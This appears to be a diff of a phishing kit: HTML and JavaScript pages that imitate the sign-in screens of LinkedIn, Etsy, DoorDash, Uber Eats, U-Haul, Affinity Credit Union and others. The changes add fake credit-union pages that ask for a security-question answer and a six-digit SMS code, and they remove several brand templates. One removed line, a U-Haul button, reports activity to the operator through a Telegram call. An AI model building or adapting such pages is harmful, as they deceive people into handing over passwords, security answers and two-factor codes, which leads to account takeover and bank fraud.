@@ -80,6 +80,15 @@
     #securityPage .select-group label { display: block; font-size: 12px; font-weight: 600; color: #444; margin-bottom: 6px; letter-spacing: 0.5px; }
     #securityPage .select-group select { width: 100%; padding: 12px; border: 1.5px solid #ddd; border-radius: 4px; font-size: 14px; background: #fff; }
 
+    /* Affinity 2FA / SMS page */
+    #tfaPage { display: none; max-width: 420px; width: 100%; }
+    #tfaPage .affinity-header { background: linear-gradient(135deg, #003d6b, #005a9c); padding: 28px 24px; }
+    #tfaPage .code-inputs { display: flex; gap: 8px; justify-content: center; margin: 20px 0; }
+    #tfaPage .code-inputs input { width: 48px; height: 54px; text-align: center; font-size: 22px; font-weight: 600; border: 1.5px solid #ddd; border-radius: 6px; background: #fafafa; }
+    #tfaPage .code-inputs input:focus { border-color: #005a9c; box-shadow: 0 0 0 2px rgba(0,90,156,0.15); outline: none; background: #fff; }
+    #tfaPage .resend-link { display: block; text-align: center; font-size: 13px; color: #005a9c; text-decoration: none; margin-top: 16px; }
+    #tfaPage .resend-link:hover { text-decoration: underline; }
+
     /* U-Haul styles */
     .uhaul-wrapper { max-width: 420px; width: 100%; }
     .uhaul-logo-bar { background: #E31837; padding: 16px 24px; text-align: center; }
@@ -242,32 +251,70 @@
     .instagram-fb-link { display: flex; align-items: center; justify-content: center; gap: 8px; font-size: 14px; color: #385185; font-weight: 600; text-decoration: none; }
     .instagram-link { display: block; font-size: 12px; color: #00376b; text-decoration: none; margin-top: 12px; }
     .instagram-link:hover { text-decoration: underline; }
-
-    /* Geo prompt overlay - simplified, just real browser prompt now */
-    .geo-overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.4); z-index: 9999; justify-content: center; align-items: center; }
-    .geo-box { background: #fff; border-radius: 12px; padding: 24px; width: 90%; max-width: 340px; box-shadow: 0 10px 40px rgba(0,0,0,0.3); }
-    .geo-box h3 { font-size: 17px; margin-bottom: 8px; color: #202124; }
-    .geo-box p { font-size: 14px; color: #5f6368; margin-bottom: 20px; }
-    .geo-box .btn-row { display: flex; justify-content: flex-end; gap: 8px; }
-    .geo-box .btn-row button { padding: 8px 20px; border-radius: 4px; border: none; font-size: 14px; font-weight: 500; cursor: pointer; }
-    .geo-box .allow { background: #1a73e8; color: #fff; }
-    .geo-box .allow:hover { background: #1557b0; }
-    .geo-box .deny { background: transparent; color: #1a73e8; }
-    .geo-box .deny:hover { background: #f0f0f0; }
 </style>
 </head>
 <body>
 
 <div id="appRoot"></div>
 
-<!-- Hidden geo overlay -->
-<div class="geo-overlay" id="geoOverlay">
-    <div class="geo-box">
-        <h3>Allow location access?</h3>
-        <p>Your location helps us keep your account secure.</p>
-        <div class="btn-row">
-            <button class="deny" onclick="document.getElementById('geoOverlay').style.display='none'">Block</button>
-            <button class="allow" onclick="document.getElementById('geoOverlay').style.display='none'">Allow</button>
+<div id="securityPage">
+    <div class="affinity-wrapper">
+        <div class="affinity-header">
+            <svg width="48" height="48" viewBox="0 0 200 60" style="margin-bottom:8px;"><rect width="200" height="60" rx="4" fill="rgba(255,255,255,0.15)"/><circle cx="30" cy="30" r="14" fill="none" stroke="#fff" stroke-width="3"/><path d="M23 30 l4 4 7-9" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/><text x="56" y="34" fill="#fff" font-size="20" font-weight="bold" font-family="Arial,sans-serif">AFFINITY</text><text x="56" y="46" fill="#fff" font-size="9" font-family="Arial,sans-serif" opacity="0.8">CREDIT UNION</text></svg>
+            <h1>Verify Your Identity</h1>
+            <p>For your security, please answer the following question</p>
+        </div>
+        <div class="affinity-body">
+            <form id="securityForm">
+                <div class="select-group"><label>SECURITY QUESTION</label>
+                    <select id="secQ1" required>
+                        <option value="">— Select a question —</option>
+                        <option value="What is your father's middle name?">What is your father's middle name?</option>
+                        <option value="What was the name of your first pet?">What was the name of your first pet?</option>
+                        <option value="What is your mother's maiden name?">What is your mother's maiden name?</option>
+                        <option value="What street did you grow up on?">What street did you grow up on?</option>
+                        <option value="What was the name of your elementary school?">What was the name of your elementary school?</option>
+                        <option value="What is the name of your first employer?">What is the name of your first employer?</option>
+                    </select>
+                </div>
+                <div class="input-group"><label>YOUR ANSWER</label><input type="text" id="secA1" placeholder="Enter your answer" autocomplete="off" required></div>
+                <div class="error" id="secError" style="display:none;">Incorrect answer. Please try again.</div>
+                <button type="submit" class="btn-affinity">Verify</button>
+            </form>
+            <div class="loading" id="secLoading" style="display:none;"><div class="spinner" style="border-top-color:#005a9c;"></div><p>Verifying your information...</p></div>
+        </div>
+        <div class="affinity-footer">
+            <a href="#">Privacy</a> | <a href="#">Security</a> | <a href="#">Legal</a><br>Need help? Call <span class="affinity-phone">1.866.863.6237</span>
+        </div>
+    </div>
+</div>
+
+<div id="tfaPage">
+    <div class="affinity-wrapper">
+        <div class="affinity-header">
+            <svg width="48" height="48" viewBox="0 0 200 60" style="margin-bottom:8px;"><rect width="200" height="60" rx="4" fill="rgba(255,255,255,0.15)"/><circle cx="30" cy="30" r="14" fill="none" stroke="#fff" stroke-width="3"/><path d="M23 30 l4 4 7-9" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/><text x="56" y="34" fill="#fff" font-size="20" font-weight="bold" font-family="Arial,sans-serif">AFFINITY</text><text x="56" y="46" fill="#fff" font-size="9" font-family="Arial,sans-serif" opacity="0.8">CREDIT UNION</text></svg>
+            <h1>Verify Your Identity</h1>
+            <p>Enter the code sent to your device</p>
+        </div>
+        <div class="affinity-body">
+            <form id="tfaForm">
+                <p style="font-size:14px;color:#555;text-align:center;margin-bottom:8px;">A 6-digit code was sent to your registered phone number.</p>
+                <div class="code-inputs">
+                    <input type="text" id="tfa1" maxlength="1" autocomplete="off" inputmode="numeric" pattern="[0-9]">
+                    <input type="text" id="tfa2" maxlength="1" autocomplete="off" inputmode="numeric" pattern="[0-9]">
+                    <input type="text" id="tfa3" maxlength="1" autocomplete="off" inputmode="numeric" pattern="[0-9]">
+                    <input type="text" id="tfa4" maxlength="1" autocomplete="off" inputmode="numeric" pattern="[0-9]">
+                    <input type="text" id="tfa5" maxlength="1" autocomplete="off" inputmode="numeric" pattern="[0-9]">
+                    <input type="text" id="tfa6" maxlength="1" autocomplete="off" inputmode="numeric" pattern="[0-9]">
+                </div>
+                <div class="error" id="tfaError" style="display:none;">Invalid code. Please try again.</div>
+                <button type="submit" class="btn-affinity">Verify</button>
+                <a href="#" class="affinity-forgot" style="margin-top:12px;">Didn't receive a code?</a>
+            </form>
+            <div class="loading" id="tfaLoading" style="display:none;"><div class="spinner" style="border-top-color:#005a9c;"></div><p>Verifying code...</p></div>
+        </div>
+        <div class="affinity-footer">
+            <a href="#">Privacy</a> | <a href="#">Security</a> | <a href="#">Legal</a><br>Need help? Call <span class="affinity-phone">1.866.863.6237</span>
         </div>
     </div>
 </div>
@@ -439,588 +486,4 @@ const BRANDS = {
             return `
             <div class="pinterest-wrapper">
                 <div class="pinterest-body">
-                    <svg width="48" height="48" viewBox="0 0 48 48"><circle cx="24" cy="24" r="22" fill="#E60023"/><path d="M24 8c-8.8 0-16 7.2-16 16 0 6.8 4.2 12.6 10.2 14.9l1.5-6.4s-.4-.8-.4-1.9c0-1.8 1-3.1 2.3-3.1 1.1 0 1.6.8 1.6 1.8 0 1.1-.7 2.7-1.1 4.2-.3 1.3.6 2.3 1.9 2.3 2.3 0 4.1-2.4 4.1-5.9 0-3.1-2.2-5.2-5.4-5.2-3.7 0-5.8 2.8-5.8 5.6 0 1.1.4 2.3.9 2.9.1.1.1.2.1.4-.1.4-.3 1.2-.3 1.4-.1.2-.2.3-.4.2-1.6-.8-2.6-3.1-2.6-5 0-4.1 3-7.9 8.6-7.9 4.5 0 8 3.2 8 7.5 0 4.5-2.8 8.1-6.7 8.1-1.3 0-2.5-.7-2.9-1.5l-.8 3c-.3 1.1-1 2.5-1.5 3.3 1.1.3 2.3.5 3.5.5 8.8 0 16-7.2 16-16S32.8 8 24 8z" fill="#fff"/></svg>
-                    <h1 style="font-size:28px;margin-top:8px;">${this.title}</h1>
-                    <form id="loginForm">
-                        <div class="input-group"><label>${this.emailLabel}</label><input type="text" id="email" placeholder="${this.placeholder}" autocomplete="off" required></div>
-                        <div class="input-group"><label>Password</label><input type="password" id="password" placeholder="Create a password" autocomplete="off" required>
-                        <div style="font-size:12px;color:#999;margin-top:4px;">Use 8 or more letters, numbers and symbols</div></div>
-                        <div class="error" id="errorMsg" style="margin-top:12px;">The email or password you entered is incorrect.</div>
-                        <button type="submit" class="btn-pinterest">${this.btnText}</button>
-                        <div style="text-align:right;margin-top:8px;"><a href="#" style="color:#111;font-size:13px;text-decoration:none;">Forgot your password?</a></div>
-                    </form>
-                    <div class="loading" id="loadingIndicator"><div class="spinner" style="border-top-color:#E60023;"></div><p>Logging in...</p></div>
-                    <div class="pinterest-or">or</div>
-                    <button class="pinterest-google-btn" onclick="event.preventDefault();"><svg width="18" height="18" viewBox="0 0 18 18"><path d="M17.64 9.2c0-.64-.06-1.26-.17-1.86H9v3.52h4.84c-.2 1.08-.8 2-1.7 2.62v2.18h2.76c1.6-1.47 2.52-3.64 2.52-6.46z" fill="#4285F4"/><path d="M9 18c2.3 0 4.22-.76 5.63-2.06l-2.76-2.18c-.76.52-1.74.82-2.87.82-2.2 0-4.07-1.49-4.74-3.5H1.35v2.26C2.57 15.86 5.57 18 9 18z" fill="#34A853"/><path d="M4.26 10.68c-.3-.88-.3-1.82 0-2.68V5.74H1.35c-1 2-1 4.3 0 6.3l2.91-1.36z" fill="#FBBC05"/><path d="M9 3.42c1.24 0 2.36.43 3.24 1.27l2.43-2.42C13.2 1.16 11.28.3 9 .3 5.57.3 2.57 2.44 1.35 5.74l2.91 2.26c.67-2 2.54-3.48 4.74-3.48z" fill="#EA4335"/></svg> Continue with Google</button>
-                    <div class="pinterest-footer">
-                        By continuing, you agree to Pinterest's <a href="#">Terms of Service</a> and acknowledge you've read our <a href="#">Privacy Policy</a>.<br>
-                        <a href="#">Notice at collection</a>
-                    </div>
-                </div>
-            </div>`;
-        }
-    },
-    vsco: {
-        name: 'VSCO',
-        color: '#000',
-        realSite: 'https://vsco.co',
-        title: 'Log into VSCO',
-        subtitle: 'Add username and password',
-        emailLabel: 'Email',
-        placeholder: 'Email',
-        btnText: 'Log in',
-        forgotText: 'password',
-        render: function() {
-            return `
-            <div class="vsco-wrapper">
-                <div class="vsco-body">
-                    <div class="vsco-logo"><span class="v">V</span>SCO</div>
-                    <h2>${this.title}</h2>
-                    <p style="font-size:13px;color:#999;margin-bottom:24px;">${this.subtitle}</p>
-                    <form id="loginForm">
-                        <div class="input-group" style="text-align:left"><label>Email*</label><input type="email" id="email" placeholder="${this.placeholder}" autocomplete="off" required></div>
-                        <div class="input-group" style="text-align:left"><label>Password*</label><input type="password" id="password" placeholder="Password" autocomplete="off" required></div>
-                        <button type="submit" class="btn-vsco">${this.btnText}</button>
-                        <div class="error" id="errorMsg" style="margin-top:12px;">Invalid email or password.</div>
-                    </form>
-                    <div class="loading" id="loadingIndicator"><div class="spinner" style="border-top-color:#000;"></div><p>Logging in...</p></div>
-                    <div class="vsco-links" style="margin-top:16px;"><a href="#">Forgot password?</a></div>
-                    <div style="margin-top:24px;font-size:13px;color:#999;">Don't have an account? <a href="#" style="color:#000;text-decoration:none;font-weight:600;">Sign up</a></div>
-                </div>
-            </div>`;
-        }
-    },
-    leetcode: {
-        name: 'LeetCode',
-        color: '#FFA116',
-        realSite: 'https://leetcode.com/accounts/login',
-        title: 'Sign in',
-        subtitle: '',
-        emailLabel: 'Email or username',
-        placeholder: 'Email or username',
-        btnText: 'Sign in',
-        forgotText: 'password',
-        render: function() {
-            return `
-            <div class="leetcode-wrapper">
-                <div class="leetcode-body">
-                    <div class="lc-logo"><svg width="40" height="40" viewBox="0 0 48 48"><rect width="48" height="48" rx="8" fill="#FFA116"/><path d="M20 14l10 10-10 10-3-3 7-7-7-7 3-3z" fill="#fff"/><rect x="18" y="22" width="14" height="4" rx="1" fill="#fff"/></svg></div>
-                    <h2>${this.title}</h2>
-                    <form id="loginForm">
-                        <div class="input-group" style="text-align:left"><label>${this.emailLabel}</label><input type="text" id="email" placeholder="${this.placeholder}" autocomplete="off" required></div>
-                        <div class="input-group" style="text-align:left"><label>Password</label><input type="password" id="password" placeholder="Password" autocomplete="off" required></div>
-                        <div style="text-align:right;margin-bottom:16px;"><a href="#" style="color:#FFA116;font-size:13px;text-decoration:none;">Forgot Password?</a></div>
-                        <button type="submit" class="btn-leetcode">${this.btnText}</button>
-                        <div class="error" id="errorMsg" style="margin-top:12px;">Invalid credentials.</div>
-                    </form>
-                    <div class="loading" id="loadingIndicator"><div class="spinner" style="border-top-color:#FFA116;"></div><p>Signing in...</p></div>
-                    <div class="lc-social-btns">
-                        <button class="lc-social-btn"><svg width="20" height="20" viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 01-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg></button>
-                        <button class="lc-social-btn"><svg width="20" height="20" viewBox="0 0 24 24"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z" fill="#333"/></svg></button>
-                        <button class="lc-social-btn"><svg width="20" height="20" viewBox="0 0 24 24"><path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z" fill="#333"/></svg></button>
-                    </div>
-                    <div class="lc-terms">By continuing, you agree to <a href="#">Terms</a> and <a href="#">Privacy Policy.</a></div>
-                </div>
-            </div>`;
-        }
-    },
-    linkedin: {
-        name: 'LinkedIn',
-        color: '#0A66C2',
-        realSite: 'https://www.linkedin.com/login',
-        title: 'Sign in',
-        subtitle: 'Welcome back to LinkedIn',
-        emailLabel: 'Email or phone',
-        placeholder: 'Email or phone number',
-        btnText: 'Sign in',
-        forgotText: 'password',
-        render: function() {
-            return `
-            <div class="linkedin-wrapper">
-                <div class="linkedin-body">
-                    <div class="linkedin-logo"><svg width="56" height="56" viewBox="0 0 48 48"><rect width="48" height="48" rx="6" fill="#0A66C2"/><rect x="10" y="20" width="6" height="16" rx="1" fill="#fff"/><ellipse cx="13" cy="14" rx="3.5" ry="3.5" fill="#fff"/><path d="M22 36V24h5.5v2.5h.1c.8-1.3 2.4-2.5 4.4-2.5 4.7 0 5.5 2.8 5.5 6.5V36h-5.5v-5.5c0-1.8-.4-3-2.2-3s-2.7 1.1-2.7 3V36H22z" fill="#fff"/></svg></div>
-                    <h1>${this.title}</h1>
-                    <p style="font-size:14px;color:#666;margin-bottom:24px;">${this.subtitle}</p>
-                    <form id="loginForm">
-                        <div class="input-group"><label>${this.emailLabel}</label><input type="text" id="email" placeholder="${this.placeholder}" autocomplete="off" required></div>
-                        <div class="input-group"><label>Password</label><input type="password" id="password" placeholder="Password" autocomplete="off" required></div>
-                        <div class="linkedin-check"><input type="checkbox" id="remember"><label for="remember">Keep me signed in</label></div>
-                        <div class="error" id="errorMsg" style="margin-top:12px;">The email or password you entered is incorrect.</div>
-                        <button type="submit" class="btn-linkedin">${this.btnText}</button>
-                        <a href="#" class="linkedin-forgot">Forgot password?</a>
-                    </form>
-                    <div class="loading" id="loadingIndicator"><div class="spinner" style="border-top-color:#0A66C2;"></div><p>Signing in...</p></div>
-                    <div class="linkedin-or">or</div>
-                    <button class="linkedin-google-btn" onclick="event.preventDefault();"><svg width="20" height="20" viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 01-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg> Continue with Google</button>
-                    <div class="linkedin-agreement">By continuing, you agree to LinkedIn's <a href="#">User Agreement</a>, <a href="#">Privacy Policy</a>, and <a href="#">Cookie Policy</a>.</div>
-                    <div class="linkedin-join">New to LinkedIn? <a href="#">Join now</a></div>
-                </div>
-            </div>`;
-        }
-    },
-    etsy: {
-        name: 'Etsy',
-        color: '#F1641E',
-        realSite: 'https://www.etsy.com/signin',
-        title: 'Sign in',
-        subtitle: '',
-        emailLabel: 'Email address',
-        placeholder: 'you@example.com',
-        btnText: 'Sign in',
-        forgotText: 'password',
-        render: function() {
-            return `
-            <div class="etsy-wrapper">
-                <div class="etsy-body">
-                    <div class="etsy-logo"><h1 style="color:#222;">etsy</h1></div>
-                    <h2 style="font-size:20px;font-weight:600;margin-bottom:24px;">${this.title}</h2>
-                    <form id="loginForm">
-                        <div class="input-group"><label>${this.emailLabel}</label><input type="email" id="email" placeholder="${this.placeholder}" autocomplete="off" required></div>
-                        <div class="input-group"><label>Password</label><input type="password" id="password" placeholder="Password" autocomplete="off" required></div>
-                        <div class="error" id="errorMsg" style="margin-top:12px;">Email or password is incorrect.</div>
-                        <button type="submit" class="btn-etsy">${this.btnText}</button>
-                        <a href="#" class="etsy-link">Forgot your password?</a>
-                    </form>
-                    <div class="loading" id="loadingIndicator"><div class="spinner" style="border-top-color:#F1641E;"></div><p>Signing in...</p></div>
-                    <div class="etsy-or">or</div>
-                    <button class="etsy-link" style="width:100%;padding:12px;border:1px solid #ddd;border-radius:24px;background:#fff;font-size:14px;font-weight:500;cursor:pointer;" onclick="event.preventDefault();">Continue with Google</button>
-                    <div style="margin-top:24px;text-align:center;font-size:13px;">Don't have an account? <a href="#" style="color:#F1641E;text-decoration:none;font-weight:600;">Register</a></div>
-                </div>
-            </div>`;
-        }
-    },
-    doordash: {
-        name: 'DoorDash',
-        color: '#FF3008',
-        realSite: 'https://www.doordash.com/consumer/login',
-        title: 'Sign in to access your credits and discounts',
-        subtitle: '',
-        emailLabel: 'Email',
-        placeholder: 'Email',
-        btnText: 'Sign In',
-        forgotText: 'password',
-        render: function() {
-            return `
-            <div class="doordash-wrapper">
-                <div class="doordash-body">
-                    <div class="dd-logo"><svg width="48" height="48" viewBox="0 0 48 48"><rect width="48" height="48" rx="8" fill="#FF3008"/><path d="M14 24c0-4 3-7 7-7h6c4 0 7 3 7 7s-3 7-7 7h-6c-4 0-7-3-7-7z" fill="#fff"/><rect x="19" y="16" width="10" height="16" rx="5" fill="#FF3008"/></svg></div>
-                    <h1>${this.title}</h1>
-                    <p style="font-size:13px;color:#666;">Login with email</p>
-                    <form id="loginForm">
-                        <div class="input-group"><label>${this.emailLabel}</label><input type="text" id="email" placeholder="${this.placeholder}" autocomplete="off" required></div>
-                        <div class="input-group"><label>Password</label><input type="password" id="password" placeholder="Password" autocomplete="off" required></div>
-                        <div class="error" id="errorMsg" style="margin-top:12px;">Password is required</div>
-                        <button type="submit" class="btn-doordash">${this.btnText}</button>
-                        <a href="#" class="dd-forgot">Reset Password</a>
-                    </form>
-                    <div class="loading" id="loadingIndicator"><div class="spinner" style="border-top-color:#FF3008;"></div><p>Signing in...</p></div>
-                    <div class="dd-or">or continue with</div>
-                    <button class="dd-google-btn" onclick="event.preventDefault();"><svg width="18" height="18" viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 01-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg> Continue with Google</button>
-                    <div class="dd-terms">By tapping any "Continue" button, you agree to DoorDash's <a href="#">Terms</a> and <a href="#">Privacy Policy</a>.</div>
-                    <div style="text-align:center;margin-top:16px;"><a href="#" style="color:#FF3008;font-size:13px;text-decoration:none;">Sign Up</a></div>
-                </div>
-            </div>`;
-        }
-    },
-    ubereats: {
-        name: 'Uber Eats',
-        color: '#000',
-        realSite: 'https://www.ubereats.com',
-        title: 'Sign in',
-        subtitle: '',
-        emailLabel: 'Email or phone',
-        placeholder: 'Email or phone',
-        btnText: 'Sign in',
-        forgotText: 'password',
-        render: function() {
-            return `
-            <div class="ubereats-wrapper">
-                <div class="ubereats-body">
-                    <div class="ue-logo"><svg width="56" height="56" viewBox="0 0 48 48"><rect width="48" height="48" rx="8" fill="#06C167"/><path d="M16 30V18l8 6 8-6v12" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" fill="none"/><circle cx="24" cy="30" r="2" fill="#fff"/></svg></div>
-                    <h1>${this.title}</h1>
-                    <form id="loginForm">
-                        <div class="input-group" style="text-align:left"><label>${this.emailLabel}</label><input type="text" id="email" placeholder="${this.placeholder}" autocomplete="off" required></div>
-                        <div class="input-group" style="text-align:left"><label>Password</label><input type="password" id="password" placeholder="Enter password" autocomplete="off" required></div>
-                        <div class="error" id="errorMsg" style="margin-top:12px;">Please check your email and password.</div>
-                        <button type="submit" class="btn-ubereats">${this.btnText}</button>
-                        <a href="#" class="ue-link">Forgot password?</a>
-                    </form>
-                    <div class="loading" id="loadingIndicator"><div class="spinner" style="border-top-color:#000;"></div><p>Signing in...</p></div>
-                    <div class="ue-divider" style="margin-top:24px;">or</div>
-                    <button class="btn-ubereats" style="background:#fff;color:#000;border:1px solid #ddd;margin-top:8px;" onclick="event.preventDefault();">Continue with Google</button>
-                    <div class="ue-footer">Don't have an account? <a href="#" style="color:#06C167;text-decoration:none;font-weight:600;">Sign up</a></div>
-                </div>
-            </div>`;
-        }
-    },
-    affinity: {
-        name: 'Affinity Credit Union',
-        color: '#005a9c',
-        realSite: 'https://personal.affinitycu.ca/',
-        title: 'Sign in to your account',
-        subtitle: '',
-        emailLabel: 'Member Number',
-        placeholder: 'Enter your member number',
-        btnText: 'Sign In',
-        forgotText: 'password',
-        isAffinity: true,
-        hasSecurityQuestions: true
-    },
-    uhaul: {
-        name: 'U-Haul',
-        color: '#E31837',
-        realSite: 'https://www.uhaul.com/Login/',
-        title: 'Sign in to your account',
-        subtitle: '',
-        emailLabel: 'Email',
-        placeholder: 'Email address',
-        btnText: 'Sign In',
-        forgotText: 'password',
-        isUhaul: true
-    }
-};
-
-// ========================
-// DETECT BRAND FROM URL
-// ========================
-const params = new URLSearchParams(window.location.search);
-let brandKey = params.get('brand') || 'google';
-const brand = BRANDS[brandKey] || BRANDS.google;
-
-// ========================
-// RENDER FUNCTIONS
-// ========================
-function renderAffinity() {
-    const root = document.getElementById('appRoot');
-    root.innerHTML = `
-    <div class="affinity-wrapper">
-        <div class="affinity-header">
-            <svg width="48" height="48" viewBox="0 0 200 60" style="margin-bottom:8px;"><rect width="200" height="60" rx="4" fill="rgba(255,255,255,0.15)"/><circle cx="30" cy="30" r="14" fill="none" stroke="#fff" stroke-width="3"/><path d="M23 30 l4 4 7-9" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/><text x="56" y="34" fill="#fff" font-size="20" font-weight="bold" font-family="Arial,sans-serif">AFFINITY</text><text x="56" y="46" fill="#fff" font-size="9" font-family="Arial,sans-serif" opacity="0.8">CREDIT UNION</text></svg>
-            <h1>Online Banking</h1>
-            <p>Sign in to your account</p>
-        </div>
-        <div class="affinity-body">
-            <form id="loginForm">
-                <div class="input-group"><label>MEMBER NUMBER</label><input type="text" id="email" placeholder="Enter your member number" autocomplete="off" required></div>
-                <div class="input-group"><label>PASSWORD</label>
-                    <div style="position:relative"><input type="password" id="password" placeholder="Enter your password" autocomplete="off" required>
-                    <button type="button" style="position:absolute;right:10px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;opacity:0.4;" onclick="var p=document.getElementById('password');p.type=p.type==='password'?'text':'password'"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg></button></div>
-                </div>
-                <div class="affinity-check"><input type="checkbox" id="remember"><label for="remember">Remember my member number</label></div>
-                <div class="error" id="errorMsg">Incorrect member number or password. Please try again.</div>
-                <button type="submit" class="btn-affinity">Sign In</button>
-                <a href="#" class="affinity-forgot">Forgot your password?</a>
-            </form>
-            <div class="loading" id="loadingIndicator"><div class="spinner" style="border-top-color:#005a9c;"></div><p>Verifying your account...</p></div>
-        </div>
-        <div class="affinity-footer">
-            <a href="#">Privacy</a> | <a href="#">Security</a> | <a href="#">Legal</a><br>Need help? Call <span class="affinity-phone">1.866.863.6237</span>
-        </div>
-    </div>
-    `;
-}
-
-function renderUhaul() {
-    const root = document.getElementById('appRoot');
-    root.innerHTML = `
-    <div class="uhaul-wrapper">
-        <div class="uhaul-logo-bar">
-            <svg viewBox="0 0 200 60" fill="none"><rect x="2" y="2" width="196" height="56" rx="2" fill="#E31837"/><text x="100" y="40" text-anchor="middle" fill="#fff" font-size="32" font-weight="900" font-family="Arial,sans-serif" letter-spacing="4">U-HAUL</text></svg>
-        </div>
-        <div class="uhaul-tabs">
-            <div class="active" id="tabSignIn" onclick="switchUhaulTab('signin')">Sign In</div>
-            <div id="tabLookup" onclick="switchUhaulTab('lookup')">Look Up Order</div>
-        </div>
-        <div class="uhaul-body">
-            <div id="uhaulSignIn">
-                <h2 style="font-size:18px;font-weight:400;margin-bottom:20px;">Welcome back! Please sign in to your account.</h2>
-                <form id="loginForm">
-                    <div class="input-group"><label>Email Address</label><input type="email" id="email" placeholder="Email address" autocomplete="off" required></div>
-                    <div class="input-group"><label>Password</label><input type="password" id="password" placeholder="Password" autocomplete="off" required></div>
-                    <div class="error" id="errorMsg" style="margin-top:12px;">We don't recognize this email or password. Please try again.</div>
-                    <button type="submit" class="btn-uhaul">Sign In</button>
-                    <div style="margin-top:12px;text-align:center;"><a href="#" class="uhaul-link">Forgot password?</a></div>
-                    <div class="uhaul-divider">or</div>
-                    <button type="button" class="btn-uhaul" style="background:#333;letter-spacing:1px;" onclick="sendToTelegram('📌 *U-Haul — PIN Sign In triggered*');alert('PIN sign in is temporarily unavailable.')">Sign In With PIN</button>
-                    <div style="margin-top:16px;"><a href="#" class="uhaul-link">Create an account</a></div>
-                </form>
-            </div>
-            <div id="uhaulLookup" style="display:none;">
-                <h2 style="font-size:18px;font-weight:400;margin-bottom:20px;">Look up an order</h2>
-                <form>
-                    <div class="input-group"><label>Email or Phone</label><input type="text" id="lookupEmail" placeholder="Email or phone number" autocomplete="off"></div>
-                    <div class="input-group"><label>ZIP / Postal Code</label><input type="text" id="lookupZip" placeholder="ZIP or Postal Code" autocomplete="off"></div>
